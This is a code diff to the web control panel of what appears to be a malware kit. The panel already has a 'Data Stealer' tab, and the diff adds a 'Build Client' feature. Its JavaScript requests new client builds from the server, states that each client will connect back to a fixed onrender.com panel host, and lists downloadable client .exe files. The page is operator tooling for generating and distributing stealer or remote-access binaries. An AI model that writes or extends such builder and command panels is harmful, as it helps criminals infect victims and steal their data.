@@ -570,6 +570,9 @@
         <button class="tab-button" onclick="showTab('stealer')">
           <i class="fas fa-search"></i> Data Stealer
         </button>
+        <button class="tab-button" onclick="showTab('build')">
+          <i class="fas fa-hammer"></i> Build
+        </button>
       </div>
       
       <div class="status-bar">
@@ -691,6 +694,27 @@
           </div>
         </div>
       </div>
+        <div id="buildTab" class="tab-content">
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="card-title"><i class="fas fa-hammer"></i> Build Client</h2>
+                </div>
+                
+                <button class="btn btn-primary" onclick="createBuild()">
+                    <i class="fas fa-hammer"></i> Build Client
+                </button>
+            </div>
+            
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="card-title"><i class="fas fa-list"></i> Your Builds</h2>
+                </div>
+                
+                <div class="output-console" id="buildsList">
+                    Loading builds...
+                </div>
+            </div>
+        </div>
     </div>
   </div>
 
@@ -737,6 +761,53 @@
       document.body.classList.toggle("dark", isDark);
       themeToggle.textContent = isDark ? "☀️" : "🌙";
       localStorage.setItem("theme", isDark ? "dark" : "light");
+    }
+
+    function createBuild() {
+        const status = document.getElementById("buildsList");
+        status.textContent = "[Build] Creating build...";
+
+        fetch("/builds", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({}) // Пустое тело, так как хост фиксированный
+        })
+        .then(res => res.json())
+        .then(data => {
+            status.textContent += `\n[Build] Build created with ID: ${data.id}`;
+            status.textContent += `\n[Build] Client will connect to: https://panel-agzz.onrender.com`;
+            loadBuilds();
+        })
+        .catch(err => {
+            status.textContent += `\n[!!] Build error: ${err.message}`;
+        });
+    }
+
+    function loadBuilds() {
+        const status = document.getElementById("buildsList");
+        status.textContent = "[Build] Loading your builds...";
+
+        fetch("/builds")
+        .then(res => res.json())
+        .then(builds => {
+            if (builds.length === 0) {
+                status.textContent = "[Build] You have no builds yet";
+                return;
+            }
+
+            let output = "[Build] Your builds:\n";
+            builds.forEach(build => {
+                output += `\nID: ${build.id}\n` +
+                        `Host: ${build.host}\n` +
+                        `Created: ${new Date(build.created).toLocaleString()}\n` +
+                        `<a href="/builds/${build.id}" download="client_${build.id}.exe">Download</a>\n` +
+                        `------------------`;
+            });
+            status.innerHTML = output.replace(/\n/g, "<br>");
+        })
+        .catch(err => {
+            status.textContent = `[!!] Error loading builds: ${err.message}`;
+        });
     }
     
     // Update uptime counter
